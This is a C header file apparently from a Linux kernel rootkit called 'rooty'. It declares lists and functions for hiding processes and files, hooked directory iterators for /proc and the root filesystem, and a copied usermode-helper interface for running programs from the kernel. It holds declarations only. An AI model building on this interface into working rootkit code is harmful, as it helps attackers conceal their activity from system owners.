#ifndef ROOTY_PROC_FS_HIDE_H
#define ROOTY_PROC_FS_HIDE_H

#include <linux/types.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/dirent.h>

struct hidden_proc {
    pid_t pid;
    struct list_head list;
};

struct hidden_file {
    char *name;
    struct list_head list;
};

struct n_subprocess_info {
    struct work_struct work;
    struct completion *complete;
    char *path;
    char **argv;
    char **envp;
    int wait;
    int retval;
    int (*init)(struct subprocess_info *info);
    void (*cleanup)(struct subprocess_info *info);
    void *data;
    pid_t pid;
};

extern struct list_head hidden_procs;
extern struct list_head hidden_files;
extern int callmodule_pid;

void hide_proc(pid_t pid);
void unhide_proc(pid_t pid);
void hide_file(char *name);
void unhide_file(char *name);
void *get_vfs_iterate(const char *path);

int n_root_iterate(struct file *file, void *dirent, filldir_t filldir);
int n_proc_iterate(struct file *file, void *dirent, filldir_t filldir);

extern int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
extern int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);

struct n_subprocess_info *n_call_usermodehelper_setup(char *path, char **argv,
        char **envp, gfp_t gfp_mask);
int n_call_usermodehelper(char *path, char **argv, char **envp, int wait);

#endif /* ROOTY_PROC_FS_HIDE_H */
